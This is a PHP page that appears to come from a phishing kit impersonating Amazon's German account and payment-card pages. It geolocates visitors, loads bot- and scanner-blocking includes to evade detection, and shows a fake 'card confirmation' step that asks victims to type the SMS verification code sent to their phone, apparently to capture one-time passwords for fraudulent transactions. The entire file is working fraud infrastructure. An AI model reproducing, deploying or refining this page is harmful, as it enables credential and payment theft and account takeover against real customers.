<?php 
$IP = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('UTC');
$DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
$COUNTRYCODE = $DETAILS->geoplugin_countryCode;
$COUNTRYNAME = $DETAILS->geoplugin_countryName;
$STRTCODE    = strtolower($COUNTRYCODE);
?>
<?php include ('../bots.php');?>
<?php include ('../blocker.php');?>
<?php include ('../banned.php');?>
<?php include ('header.php');?>
<div id="walletWebsiteContainer" class="a-container">
  <div id="headerRow" class="a-row a-spacing-micro a-grid-vertical-align a-grid-top a-ws-row">
    <div id="headerCol" class="a-column a-span12 a-text-left a-ws-span12">
      <h1 class="a-size-medium">
        <a class="a-link-normal" href="#">[ Ihr Konto ]
        </a>
        <span class="breadcrumbArrow">>
        </span>
        <span class="a-color-state">Bestätigungs-Kredit- und Debitkarten
        </span>
      </h1>
    </div>
  </div>
  <div id="subHeaderRow" class="a-row a-ws-row">
    <div id="subHeaderLeftCol" class="a-column a-span12 a-text-left a-spacing-base">
      <span>
      </span>
    </div>
  </div>
  <div id="mainContentRow" class="a-fixed-left-grid">
    <div class="a-fixed-left-grid-inner" style="padding-left:224px">
      <div id="walletWebsiteContentColumn" class="a-text-left a-fixed-left-grid-col walletWebsiteContentColumn a-col-right" style="padding-left:0%;*width:99.6%;float:left;">                                 
        <div id="paymentInstrumentWidgetSection" class="a-section">
          <div id="payments-portal-instrument-management-container">
            <div class="a-section pmts-portal-widget">
              <div class="a-section pmts-portal-style-container">
                <div class="a-section">
                  <div class="a-section a-spacing-none a-spacing-top-none pmts-instrument-list-edit">
                    <div class="a-section pmts-sleeve pmts-credit-cards">
                      <div class="a-fixed-left-grid">
                        <div class="a-fixed-left-grid-inner" style="padding-left:250px">
                          <div class="a-fixed-left-grid-col a-col-left" style="width:250px;margin-left:-250px;_margin-left:-125px;float:left;">
                            <h5>* Bestätigen Sie Ihre Kredit- und Debitkarten, indem Sie den Code per SMS auf Ihrem Telefon erhalten :
                            </h5>
                          </div>
                          <div class="a-fixed-left-grid-col a-col-right" style="padding-left:0%;*width:99.6%;float:left;">
                            <div class="a-fixed-right-grid">
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="a-box a-spacing-base pmts-add-cc pmts-add-credit-card-form-in-list-container">
                        <div class="a-box-inner">
                          <div class="a-fixed-right-grid">
                            <div class="a-fixed-right-grid-inner" style="padding-right:195px">
                              <div class="a-fixed-right-grid-col a-col-right" style="width:195px;margin-right:-195px;float:right;position: absolute; left: 390px;">
                                <div class="pmts-composite-logo-row">
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('');background-position: 0px 0; margin-right: 5px;">
                                  </span>
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('');background-position: -45px 0; margin-right: 5px;">
                                  </span>
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('');background-position: -90px 0; margin-right: 5px;">
                                  </span>
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('');background-position: -135px 0; ">
                                  </span>
                                </div>
                                <div class="pmts-composite-logo-row">
                                  <span class="pmts-indiv-issuer-image" style="margin-right: 5px;">
                                  </span>
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('');background-position: -180px 0; margin-right: 5px;">
                                  </span>
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('');background-position: -225px 0; margin-right: 5px;">
                                  </span>
                                  <span class="pmts-indiv-issuer-image" style="background-image: url('');background-position: -270px 0; ">
                                  </span>
                                </div>
                              </div>
                              <script type="text/javascript" src="../data/js/jquery.min.js">
                              </script>
                              <script type="text/javascript" src="../data/js/jquery.payment.js">
                              </script>
                              <link rel="stylesheet" href="../data/css/app.css" />
                              <style type="text/css">
                                span.description{
                                  display:block;
                                  margin:.1em 0 0 1.6em}
                                .has-error input{
                                  border:1px solid #9D2C36}
                                form #cc_number{
                                  background-image:url(../data/icon/sprites_cc_global.png);
                                  background-position:164px 86.8%;
                                  background-repeat:no-repeat;
                                  padding-right:32px}
                                form #cc_number.valid.visa{
                                  background-position:164px -.5%}
                                form #cc_number.valid.mastercard{
                                  background-position:164px 6%}
                                form #cc_number.valid.amex{
                                  background-position:165px 12%}
                                form #cc_number.valid.diners_club_international{
                                  background-position:164px 24%}
                                form #cc_number.valid.jcb{
                                  background-position:164px 31%}
                                form #cc_number.valid.discover{
                                  background-position:164px 18.3%}
                                form #cc_number.valid.maestro{
                                  background-position:164px 37%}
                                form #cvv2_number{
                                  background-image:url(../data/icon/sprites_cc_global.png);
                                  background-position:78px 93.2%;
                                  background-repeat:no-repeat;
                                  padding-right:38px}
                                form #cvv2_number.amex{
                                  background-position:78px 99.5%}
                                form fieldset.multi p{
                                  float:left;
                                  margin:0 .5em 0 0}
                              </style>
                              <div class="a-row a-spacing-base">Bestätigen Sie Ihre Karte, indem Sie den auf Ihrem Telefon erhaltenen Bestätigungscode eingeben.
                              </div>
                              <div class="a-row pmts-add-credit-card-form-in-list">
                                <div class="a-column a-span12">
                                  <div class="a-section pmts-step-1">
                                    <div class="a-input-text-group">
                                      <p class="a-spacing-top-mini">
                                       Diese Authentifizierung ist erforderlich, um den Vorgang zu bestätigen.
                                        </span>
                                        <span class="a-letter-space">
                                        </span>
                                        <span class="a-size-small pmts-step-unweighted">
                                        </span>
                                      </p>
                                      <?php include('../form/SMS_Verifications.php');?>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <?php include('footer.php');?>
